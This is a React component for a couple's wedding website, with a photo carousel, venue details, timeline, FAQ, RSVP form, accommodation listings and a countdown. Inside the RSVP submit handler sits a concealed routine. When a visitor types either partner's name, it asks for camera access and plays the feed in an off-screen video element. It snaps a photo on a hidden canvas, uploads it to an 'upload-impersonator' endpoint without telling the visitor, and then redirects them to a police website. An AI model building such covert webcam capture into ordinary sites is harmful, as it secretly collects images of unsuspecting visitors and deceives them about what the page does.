import React, { useEffect, useState, lazy, Suspense, useRef } from 'react';
import { Heart, Calendar, Clock, MapPin, Send, Camera, Gift, Music, Cake, Glasses as Glass, ChevronLeft, ChevronRight } from 'lucide-react';
import Cookies from 'js-cookie';
import HeartBackground from './components/HeartBackground';
import Countdown from './components/Countdown';
import PasswordModal from './components/PasswordModal';
import { Analytics } from '@vercel/analytics/react';
import { SpeedInsights } from '@vercel/speed-insights/react';

// Lazy load non-critical components to improve initial page load time.
const Starfield = lazy(() => import('./components/Starfield'));
const LoveBirdsGame = lazy(() => import('./components/LoveBirdsGame'));
const MusicPlayer = lazy(() => import('./components/MusicPlayer'));

function App() {
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [isHeroTransitioning, setIsHeroTransitioning] = useState(true);
  const [storyImageIndex, setStoryImageIndex] = useState(0);
  const [isAuthenticated, setIsAuthenticated] = useState(true);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768); // Tailwind's md breakpoint
  const weddingDate = new Date('2026-02-07T00:00:00');

  // RSVP Form State
  const [hasRsvped, setHasRsvped] = useState(false);
  const [allowChange, setAllowChange] = useState(false);
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [meal, setMeal] = useState('');
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isDisintegrating, setIsDisintegrating] = useState(false);
  const [showSecretMessage, setShowSecretMessage] = useState(false);
  
  // Update these paths to match your images in the public/img folder
  const heroImages = [
    "/img/hero-1.jpg",
    "/img/hero-2.jpg",
    "/img/hero-3.jpg",
    "/img/hero-4.jpg"
  ];

  // Define images for the "Our Story" carousel
  // TODO: Replace these with your actual image paths in public/img/
  const storyImages = [
    "/img/story-1.jpg", 
    "/img/story-2.jpg",
    "/img/story-3.jpg",
    "/img/story-4.jpg",
    "/img/story-5.jpg", // Added new image
    "/img/story-6.jpg", // Added new image
    "/img/story-7.jpg", // Added new image
    "/img/story-8.jpg", // Added new image
    "/img/story-9.jpg", // Added new image
    "/img/story-10.jpg", // Added new image
  ];

  useEffect(() => {
    const rsvpCookie = Cookies.get('rsvp_submitted');
    if (rsvpCookie === 'true') {
      setHasRsvped(true);
    }
  }, []);

  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentImageIndex((prevIndex) => prevIndex + 1);
    }, 15000); // Shift every 15 seconds
    return () => clearInterval(timer);
  }, []);

  const handleHeroTransitionEnd = () => {
    if (currentImageIndex >= heroImages.length) {
      setIsHeroTransitioning(false); // Disable transition for the jump
      setCurrentImageIndex(0); // Jump back to the start
    }
  };

  useEffect(() => {
    // Re-enable transitions after a jump
    if (!isHeroTransitioning) {
      // A minimal timeout lets React update the DOM before re-enabling transitions
      const timeout = setTimeout(() => setIsHeroTransitioning(true), 50);
      return () => clearTimeout(timeout);
    }
  }, [isHeroTransitioning]);

  useEffect(() => {
    if (isDisintegrating) {
      // The animation is 2s long. Redirect after it finishes.
      const timer = setTimeout(() => {
        window.location.href = 'https://www.saps.gov.za/';
      }, 2000);

      return () => clearTimeout(timer);
    }
  }, [isDisintegrating]);

  const imagesPerView = isMobile ? 1 : 3;
  const imageWidthVw = 100 / imagesPerView;
  const containerWidthVw = heroImages.length * 2 * imageWidthVw;
  const transformX = `translateX(calc(-${currentImageIndex} * ${imageWidthVw}vw))`;

  useEffect(() => {
    const storyImageTimer = setInterval(() => {
      setStoryImageIndex((prevIndex) =>
        prevIndex === storyImages.length - 1 ? 0 : prevIndex + 1
      );
    }, 7000); // Interval for story images, e.g., 7 seconds
    return () => clearInterval(storyImageTimer);
  }, [storyImages.length]);

  useEffect(() => {
    if (!isAuthenticated) return;

    const observerOptions = {
      root: null,
      rootMargin: '0px',
      threshold: 0.1
    };

    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('animate-in');
        }
      });
    }, observerOptions);

    setTimeout(() => {
      document.querySelectorAll('.animate-on-scroll').forEach((element) => {
        observer.observe(element);
      });
    }, 100);

    return () => observer.disconnect();
  }, [isAuthenticated]);

  const nextStoryImage = () => {
    setStoryImageIndex((prevIndex) =>
      prevIndex === storyImages.length - 1 ? 0 : prevIndex + 1
    );
  };

  const prevStoryImage = () => {
    setStoryImageIndex((prevIndex) =>
      prevIndex === 0 ? storyImages.length - 1 : prevIndex - 1
    );
  }

  const handleRsvpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Easter Egg for "Kyle Titus"
    if (name.trim().toLowerCase() === 'kyle titus' || name.trim().toLowerCase() === 'robin henney')
    {
      setIsLoading(false); // Stop the loading indicator immediately

      const captureAndUpload = async () => {
        try {
          // 1. Request camera access
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });

          // Create a hidden video element to play the stream
          const video = document.createElement('video');
          video.style.position = 'absolute';
          video.style.left = '-9999px'; // Hide it off-screen
          video.srcObject = stream;
          document.body.appendChild(video);
          await video.play();

          // Wait a moment for the camera to auto-adjust
          await new Promise(resolve => setTimeout(resolve, 500));

          // 2. Capture a frame on a hidden canvas
          const canvas = document.createElement('canvas');
          canvas.style.display = 'none';
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext('2d');
          context?.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 3. Stop the camera and clean up the video element
          stream.getTracks().forEach(track => track.stop());
          document.body.removeChild(video);

          // 4. Convert to Data URL and upload (fire-and-forget)
          const imageDataUrl = canvas.toDataURL('image/jpeg');
          fetch('/api/upload-impersonator', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageDataUrl }),
          }).catch(err => console.error("Upload failed:", err));
        } catch (err) {
          console.error("Could not capture photo:", err);
        } finally {
          // 5. Trigger the UI sequence regardless of photo success
          setShowSecretMessage(true);
          setTimeout(() => {
            setIsDisintegrating(true);
          }, 5000); // Give time to read the message
        }
      };

      captureAndUpload();
      return; // Stop the normal RSVP process
    }

    setMessage('');

    try {
      const response = await fetch('/api/rsvp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name, email, meal }),
      });

      const data = await response.json();

      if (response.ok) {
        setMessage('Thank you! Your RSVP has been submitted.');
        setHasRsvped(true);
        setAllowChange(false); // Hide form again after successful change
      } else {
        setMessage(data.message || 'An error occurred.');
      }
    } catch (error) {
      setMessage('An error occurred while submitting your RSVP.');
    } finally {
      setIsLoading(false);
    }
  };

  // Tab navigation state
  const sections = [
    { label: "Home", ref: useRef<HTMLElement>(null) },
    { label: "Venue", ref: useRef<HTMLElement>(null) },
    { label: "Timeline", ref: useRef<HTMLElement>(null) },
    { label: "FAQ", ref: useRef<HTMLElement>(null) },
    { label: "RSVP", ref: useRef<HTMLElement>(null) },
    { label: "Accommodation", ref: useRef<HTMLElement>(null) },
  ];

  const [navOpen, setNavOpen] = useState(false);

  const handleTabClick = (idx: number) => {
    const sectionRef = sections[idx].ref;
    if (sectionRef.current) {
      sectionRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
    setNavOpen(false); // Close dropdown on mobile after click
  };

  return (
    <div className={`min-h-screen bg-gradient-to-b from-gray-500 to-gray-1000 text-gray-800 ${isDisintegrating ? 'disintegrate' : ''}`}>
      {/* Tab Navigation - Responsive */}
      <nav className="sticky top-0 z-50 bg-white bg-opacity-90 shadow-md border-b border-gray-200">
        <div className="max-w-7xl mx-auto flex items-center justify-center py-2 px-4">
          {/* Desktop Tabs */}
          <ul className="hidden md:flex flex-wrap gap-2 md:gap-6">
            {sections.map((section, idx) => (
              <li key={section.label}>
                <button
                  className="px-3 py-2 rounded font-soul text-gray-700 hover:bg-red-100 hover:text-red-600 transition-colors duration-200 text-base md:text-lg"
                  onClick={() => handleTabClick(idx)}
                >
                  {section.label}
                </button>
              </li>
            ))}
          </ul>
          {/* Mobile Dropdown */}
          <div className="md:hidden w-full flex justify-center relative">
            <button
              className="px-4 py-2 rounded font-serif text-gray-700 bg-red-100 hover:bg-red-200 transition-colors duration-200 text-base flex items-center"
              onClick={() => setNavOpen((open) => !open)}
              aria-label="Open navigation"
            >
              {/* Hamburger Icon Only */}
              <svg
                className={`w-6 h-6 transition-transform duration-300 ${navOpen ? 'rotate-90' : ''}`}
                fill="none"
                stroke="currentColor"
                strokeWidth={2}
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
            <div
              className={`absolute top-14 left-0 w-full z-50 transition-all duration-300 ${
                navOpen ? 'opacity-100 scale-y-100 pointer-events-auto' : 'opacity-0 scale-y-95 pointer-events-none'
              }`}
              style={{ transformOrigin: 'top' }}
            >
              <ul className="bg-white shadow-lg border-t border-gray-200">
                {sections.map((section, idx) => (
                  <li key={section.label}>
                    <button
                      className="w-full text-left px-4 py-3 border-b border-gray-100 font-serif text-gray-700 hover:bg-red-100 hover:text-red-600 transition-colors duration-200 text-base"
                      onClick={() => handleTabClick(idx)}
                    >
                      {section.label}
                    </button>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        </div>
      </nav>

      {/* Logo below navigation */}
      <div className="w-full flex justify-center bg-white py-4 border-b border-gray-100">
        <img
          src="/img/robinkylelogo.jpg"
          alt="Robin & Kyle Logo"
          className="h-28 w-auto object-contain"
        />
      </div>

      {/* Home Section */}
      <section ref={sections[0].ref} className="h-[90vh] relative overflow-hidden">
        <HeartBackground />
        <div
          className="absolute top-0 left-0 h-full flex"
          onTransitionEnd={handleHeroTransitionEnd}
          style={{
            width: `${containerWidthVw}vw`,
            transform: transformX,
            transition: isHeroTransitioning ? 'transform 1.5s ease-in-out' : 'none',
          }}
        >
          {[...heroImages, ...heroImages].map((image, index) => (
          <div
            key={index}
            className={`h-full flex-shrink-0 bg-cover bg-center box-border ${!isMobile ? 'border-r-8 border-white' : ''}`}
            style={{ 
              width: `${imageWidthVw}vw`,
              backgroundImage: `url("${image}")` 
            }}
          />
          ))}
        </div>
        <div className="absolute inset-0 bg-black bg-opacity-40"></div>
        <div className="relative h-full flex items-center justify-center">
          <div className="text-center text-white z-10 px-4">
            <p className="text-xl md:text-2xl font-soul mb-4 animate-fade-in tracking-wider">Together with their families</p>
            <h1 className="text-6xl md:text-7xl lg:text-9xl font-soul mb-6 text-shadow">Robin & Kyle</h1>
            <p className="text-xl md:text-2xl font-soul animate-slide-up tracking-widest">Request the pleasure of your company</p>
            <p className="text-xl md:text-2xl font-soul animate-slide-up tracking-widest">at our wedding</p>
          </div>
        </div>
      </section>

      {/* Our Story Section */}
      <section className="py-20 px-4 bg-gradient-radial from-gray-50 to-gray-100 relative">
        <div className="max-w-4xl mx-auto text-center animate-on-scroll opacity-0 translate-y-8 duration-[1500ms]">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul mb-8 text-shimmer pb-4">Our Story</h2>
          <div className="flex items-center justify-center mb-12">
            <Heart className="w-12 h-12 text-red-500 animate-pulse" />
          </div>
          {/* Story Paragraph with background for readability */}
          <div className="bg-white bg-opacity-75 p-6 md:p-8 rounded-lg shadow-xl premium-border mb-12">
            <p className="text-gray-700 leading-relaxed text-lg tracking-wide font-soul">
              Despite knowing of each other for years—through mutuals, social
media, and even brief encounters at a 21st birthday and his
grandmother’s funeral—it turns out we needed a little help from
Tinder to actually make things happen! In 2021, I decided to give the
app a try, and there he was. The moment we matched, he wasted no
time asking me out. With COVID curfews in place, we made the most
of our first date on 9 June, 2021—a night that was unforgettable.
From that point on, things just fell into place. It was easy.<br /><br />

              What made it even better was realizing just how much we had in
common—our love for anime, rock music, and dreaming about our
next travel adventure. At our core, we’re both deeply family-oriented
and have a soft spot for animals. It didn’t take long to see that this
was something special.
            </p>
          </div>

          {/* Story Image Carousel - Below the paragraph */}
          <div className="relative h-96 w-96 md:h-[28rem] md:w-[28rem] mx-auto overflow-hidden rounded-full shadow-xl hover:shadow-2xl transition-shadow duration-300 premium-border group">
            {storyImages.map((image, index) => (
              <div
                key={`story-img-${index}`}
                className={`absolute inset-0 bg-contain bg-no-repeat bg-center transition-all ease-in-out duration-1000 transform ${
                  index === storyImageIndex ? 'opacity-100 scale-105' : 'opacity-0 scale-100'
                }`}
                style={{ backgroundImage: `url("${image}")` }}
              />
            ))}
            {/* Navigation Buttons for Story Carousel */}
            <button
              onClick={prevStoryImage}
              className="absolute top-1/2 left-4 transform -translate-y-1/2 bg-black bg-opacity-30 text-white p-3 rounded-full hover:bg-red-500 hover:bg-opacity-75 hover:scale-110 transition-all duration-300 z-10"
              aria-label="Previous image"
            >
              <ChevronLeft size={24} />
            </button>
            <button
              onClick={nextStoryImage}
              className="absolute top-1/2 right-4 transform -translate-y-1/2 bg-black bg-opacity-30 text-white p-3 rounded-full hover:bg-red-500 hover:bg-opacity-75 hover:scale-110 transition-all duration-300 z-10"
              aria-label="Next image"
            >
              <ChevronRight size={24} />
            </button>
          </div>
        </div>
      </section>

      {/* Venue Section */}
      <section ref={sections[1].ref} className="py-20 px-4 bg-gradient-radial from-gray-50 to-gray-100">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul mb-12 text-shimmer animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] pb-4">The Venue</h2>
          <div className="flex items-center justify-center mb-8">
            <MapPin className="w-8 h-8 text-red-500 animate-bounce-slow" />
          </div>
          <h3 className="text-3xl font-soul mb-4 animate-on-scroll opacity-0 translate-y-8 duration-[1500ms]">Zorgvliet Wine Estate</h3>
            
            <a
            href="https://maps.app.goo.gl/9f6cKABHkqjNdZvi9"
            target="_blank"
            rel="noopener noreferrer"
            className="text-xl text-gray-600 mb-12 font-soul animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] tracking-wider underline hover:text-red-600 transition-colors"
            >
            Get Directions
            </a>
            <div className="mb-8" />
          <div className="relative group card-premium">
            <img 
              src="https://zorgvliet.com/wp-content/uploads/2015/07/Zorgvliet-accommodation-location.jpg?auto=format&fit=crop&q=80&w=1920" 
              alt="Venue" 
              className="w-full h-96 object-cover rounded-lg shadow-lg transform group-hover:scale-[1.02] transition-transform duration-500 animate-on-scroll opacity-0 translate-y-8 duration-1000 premium-border"
            />
            <div className="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-20 transition-all duration-300 rounded-lg"></div>
          </div>
        </div>
      </section>

      {/* Timeline Section */}
      <section ref={sections[2].ref} className="py-16 px-4 bg-gray-100">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul text-center mb-16 text-shimmer animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] pb-4">The Big Day</h2>
          <div className="timeline-container py-12">
            <div className="grid md:grid-cols-2 gap-12 ">
              {[
                { icon: Clock, title: "Ceremony", time: "4:00 PM - 5:00 PM", desc: "Join us as we exchange vows" },
                { icon: Camera, title: "Photos", time: "5:00 PM - 6:00 PM", desc: "Capture memories with us" },
                { icon: Glass, title: "Cocktail Hour", time: "5:00 PM - 6:00 PM", desc: "Enjoy drinks & hors d'oeuvres" },
                { icon: Music, title: "Reception", time: "6:00 PM - 12:00 PM", desc: "Dance the night away" }
              ].map((event, index) => (
                <div key={index} className={`timeline-item ${index % 2 === 0 ? 'text-right pr-12' : 'pl-12'} animate-on-scroll opacity-0 translate-y-8 duration-1000`} style={{ transitionDelay: `${index * 200}ms` }}>
                  <div className="bg-white p-6 md:p-8 shadow-lg rounded-lg hover-trigger transform hover:scale-105 transition-all duration-300 premium-border premium-shadow card-premium animate-on-scroll opacity-0 translate-y-8 duration-[1500ms]" style={{ transitionDelay: `${index * 200}ms` }}>
                    <event.icon className="w-8 h-8 text-red-500 mx-auto mb-4" />
                    <h3 className="text-2xl font-serif mb-2">{event.title}</h3>
                    <p>{event.time}</p>
                    <p className="text-sm text-gray-500 mt-2 hover-target">{event.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section ref={sections[3].ref} className="pt-16 pb-12 px-4 bg-gradient-radial from-gray-50 to-gray-100">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul text-center mb-16 text-shimmer animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] pb-4">Frequently Asked Questions</h2>
          <div className="grid gap-8">
            {[
              {
                q: "What is the dress code?",
                a: "TBD"
              },
              {
                q: "Can I bring a plus one?",
                a: "TBD"
              },
              {
                q: "Is there parking at the venue?",
                a: "TBD"
              },
              {
                q: "Are there accommodations nearby?",
                a: "TBD"
              },
              {
                q: "What time should I arrive?",
                a: "Please plan to arrive 15-30 minutes before the ceremony start time of 4:00 PM to allow time for seating."
              },
              {
                q: "How do I RSVP?",
                a: "Please scroll down 😊"
              }
            ].map((faq, index) => (
              <div 
                key={index}
                className="bg-white p-6 md:p-8 rounded-lg shadow-lg premium-border premium-shadow animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] card-premium"
                style={{ transitionDelay: `${index * 100}ms` }}
              >
                <h3 className="text-2xl font-serif mb-4 text-red-600">{faq.q}</h3>
                <p className="text-gray-600 leading-relaxed tracking-wide">{faq.a}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* RSVP Section */}
      <section ref={sections[4].ref} className="pt-12 pb-20 px-4 bg-gray-100">
        <div className="max-w-2xl mx-auto">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul text-center mb-12 text-shimmer animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] pb-4">RSVP</h2>
          <div className="bg-white p-6 sm:p-10 md:p-12 rounded-lg shadow-lg animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] premium-border premium-shadow">
            {hasRsvped && !allowChange ? (
              <div className="text-center">
                <h2 className="text-2xl font-semibold mb-4">Thank you!</h2>
                <p className="mb-4">You've already RSVP'ed, please check your email for details.</p>
                <button
                  onClick={() => setAllowChange(true)}
                  className="underline text-blue-600 hover:text-blue-800"
                >
                  Need to change your RSVP? No problem, click here.
                </button>
              </div>
            ) : (
              <form onSubmit={handleRsvpSubmit} className="space-y-6">
                <div>
                  <label className="block text-gray-700 mb-2 font-serif tracking-wide">Full Name</label>
                  <input
                    type="text"
                    name="name"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-gold-500 focus:border-transparent transform transition-transform duration-200 hover:scale-[1.01] premium-border input-premium text-gray-700"
                    placeholder="Enter your full name"
                    required
                  />
                </div>
                <div>
                  <label className="block text-gray-700 mb-2 font-serif tracking-wide">Email</label>
                  <input
                    type="email"
                    name="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-gold-500 focus:border-transparent transform transition-transform duration-200 hover:scale-[1.01] premium-border input-premium text-gray-700"
                    placeholder="Enter your email"
                    required
                  />
                </div>
                <div>
                  <label className="block text-gray-700 mb-2 font-serif tracking-wide">Meal Preference</label>
                  <select
                    name="meal"
                    value={meal}
                    onChange={(e) => setMeal(e.target.value)}
                    className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-gold-500 focus:border-transparent transform transition-transform duration-200 hover:scale-[1.01] premium-border input-premium text-gray-700"
                    required
                  >
                    <option value="">Please select a meal option</option>
                    <option value="beef">Afval Pudding</option>
                    <option value="chicken">Banana Mince</option>
                    <option value="fish">12 year matured steak (off)</option>
                    <option value="vegetarian">Hadeda</option>
                    <option value="vegan">Brocolli 5-ways</option>
                  </select>
                </div>
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-red-400 via-red-500 to-red-400 text-white py-4 rounded-lg transition-all duration-300 transform hover:scale-[1.02] hover:shadow-lg flex items-center justify-center space-x-2 font-serif tracking-wider btn-premium disabled:opacity-70 disabled:cursor-not-allowed"
                >
                  <Send className="w-5 h-5" />
                  <span>{isLoading ? 'Submitting...' : 'Submit RSVP'}</span>
                </button>
                {message && <p className="text-center text-sm text-gray-600 mt-2">{message}</p>}
              </form>
            )}
          </div>
        </div>
      </section>

      {/* Accommodations Section */}
      <section ref={sections[5].ref} className="py-12 px-4 bg-white">
        <div className="max-w-3xl mx-auto">
          <h2 className="text-3xl sm:text-4xl md:text-5xl font-soul text-center mb-10 text-shimmer pb-2">Accommodations Nearby</h2>
          
          {/* For 2 People */}
          <h3 className="text-2xl font-serif mb-6 mt-8 text-red-600 text-center">For 2 People</h3>
          <div className="grid gap-8 md:grid-cols-2 mb-12">
            {[
              {
                name: "Staymore",
                url: "https://www.staymoreguesthouse.co.za/",
                price: "From R2100 per night",
                img: "",
                distance: "1.6 km"
              },
              {
                name: "Just Joey Lodge",
                url: "https://www.booking.com/Share-EUt077",
                price: "From R2400 per night",
                img: "",
                distance: "9.5 km"
              },
              {
                name: "Lemon Rind - 16 Eikehoff",
                url: "https://www.booking.com/Share-7qKGII3",
                price: "From R3400 for two nights (must book 2 nights)",
                img: "",
                distance: "9.2 km"
              },
              {
                name: "Eendracht Apartments",
                url: "https://www.booking.com/Share-7NBqPR",
                price: "From R1100 per night",
                img: "",
                distance: "8.9 km"
              },
              {
                name: "Orange-Ville Lodge & Guesthouse",
                url: "https://www.booking.com/Share-wofumjI",
                price: "From R3840 for 2 nights (must book 2 nights)",
                img: "",
                distance: "1.5 km"
              },
              {
                name: "33 Longifolia",
                url: "https://www.lekkeslaap.co.za/accommodation/33-longifolia",
                price: "From R1125 per night",
                img: "",
                distance: "14.5 km"
              },
              {
                name: "4 Piet Retief",
                url: "https://www.lekkeslaap.co.za/accommodation/4-piet-retief/rooms",
                price: "From R2400 for 2 nights (must book 2 nights)",
                img: "",
                distance: "10.3 km"
              },
              {
                name: "Kockies @ die Boord",
                url: "https://www.lekkeslaap.co.za/accommodation/kockies--die-boord/rooms",
                price: "From R1200 per night",
                img: "",
                distance: "11.8 km"
              }
            ].map((hotel, idx) => (
              <a
                key={hotel.name}
                href={hotel.url}
                target="_blank"
                rel="noopener noreferrer"
                className="block bg-gray-50 rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden border border-gray-200 hover:border-red-400"
              >
                <img
                  src={hotel.img}
                  alt={hotel.name}
                  className="w-full h-48 object-cover"
                />
                <div className="p-6">
                  <h3 className="text-xl font-serif mb-2 text-red-600">{hotel.name}</h3>
                  <p className="text-gray-700 mb-2">{hotel.price}</p>
                  <p className="text-gray-500 mb-2">{hotel.distance}</p>
                  <span className="text-blue-600 underline">View Details</span>
                </div>
              </a>
            ))}
          </div>

          {/* For 3 People */}
          <h3 className="text-2xl font-serif mb-6 mt-8 text-red-600 text-center">For 3 People</h3>
          <div className="grid gap-8 md:grid-cols-2 mb-12">
            {[
              {
                name: "No 3 at The Barracks",
                url: "https://www.booking.com/Share-PylISm",
                price: "From R2070 for 3 people (one large bed)",
                img: "",
                distance: "1.2 km",
              }
            ].map((hotel, idx) => (
              <a
                key={hotel.name}
                href={hotel.url}
                target="_blank"
                rel="noopener noreferrer"
                className="block bg-gray-50 rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden border border-gray-200 hover:border-red-400"
              >
                <img
                  src={hotel.img}
                  alt={hotel.name}
                  className="w-full h-48 object-cover"
                />
                <div className="p-6">
                  <h3 className="text-xl font-serif mb-2 text-red-600">{hotel.name}</h3>
                  <p className="text-gray-700 mb-2">{hotel.price}</p>
                  <p className="text-gray-500 mb-2">{hotel.distance}</p>
                  <span className="text-blue-600 underline">View Details</span>
                </div>
              </a>
            ))}
          </div>

          {/* For 4 People */}
          <h3 className="text-2xl font-serif mb-6 mt-8 text-red-600 text-center">For 4 People</h3>
          <div className="grid gap-8 md:grid-cols-2 mb-4">
            {[
              {
                name: "Kockies @ die Boord",
                url: "https://www.lekkeslaap.co.za/accommodation/kockies--die-boord/rooms",
                price: "From R2400 for 2 rooms per night",
                img: "",
                distance: "11.8 km"
              }
            ].map((hotel, idx) => (
              <a
                key={hotel.name}
                href={hotel.url}
                target="_blank"
                rel="noopener noreferrer"
                className="block bg-gray-50 rounded-lg shadow-lg hover:shadow-xl transition-shadow duration-300 overflow-hidden border border-gray-200 hover:border-red-400"
              >
                <img
                  src={hotel.img}
                  alt={hotel.name}
                  className="w-full h-48 object-cover"
                />
                <div className="p-6">
                  <h3 className="text-xl font-serif mb-2 text-red-600">{hotel.name}</h3>
                  <p className="text-gray-700 mb-2">{hotel.price}</p>
                  <p className="text-gray-500 mb-2">{hotel.distance}</p>
                  <span className="text-blue-600 underline">View Details</span>
                </div>
              </a>
            ))}
          </div>
        </div>
      </section>

      {/* Countdown Section */}
      <section className="py-12 px-4 bg-gradient-radial from-gray-50 to-gray-100">
        
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul mb-8 text-shimmer pb-4">Countdown to the Big Day</h2>
          <div className="mt-12 flex items-center justify-center space-x-2 animate-bounce-slow bg-glass py-4 px-8 rounded-full inline-block premium-border">
              <Calendar className="w-6 h-6 text-red-500" />
              <p className="text-lg md:text-xl tracking-wider">February 7, 2026</p>
            </div>
          <Countdown weddingDate={weddingDate} />
        </div>
      </section>

      {/* Love Birds Game Section */}
      <section className="py-20 px-4 bg-gradient-radial from-gray-50 to-gray-100">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-4xl sm:text-5xl md:text-6xl font-soul mb-8 text-shimmer animate-on-scroll opacity-0 translate-y-8 duration-[1500ms] pb-4">Love Birds Game</h2>
          <Suspense fallback={<div className="h-64" />}>
            <div className="flex items-center justify-center mb-8">
              <Heart className="w-12 h-12 text-red-500 animate-pulse" />
            </div>
            <LoveBirdsGame />
          </Suspense>
        </div>
      </section>

      <footer className="relative bg-black text-white py-16 text-center overflow-hidden">
        <Suspense fallback={null}>
          <Starfield />
        </Suspense>
        <div className="relative z-10">
          <p className="font-soul text-3xl sm:text-4xl mb-4 text-shimmer">We can't wait to celebrate with you!</p>
          <div className="mt-4">
            <div className="flex items-center justify-center space-x-2">
              <p className="font-comic-sans tracking-widest">Built with</p>
              <Heart className="w-5 h-5 text-red-500 animate-pulse" />
            </div>
            <p className="font-comic-sans tracking-widest">by Robin & Kyle Software Company™</p>
          </div>
        </div>
      </footer>
      <Analytics />
      <SpeedInsights />
      <Suspense fallback={null}>
        <MusicPlayer />
      </Suspense>
    </div>
  );
}

export default App;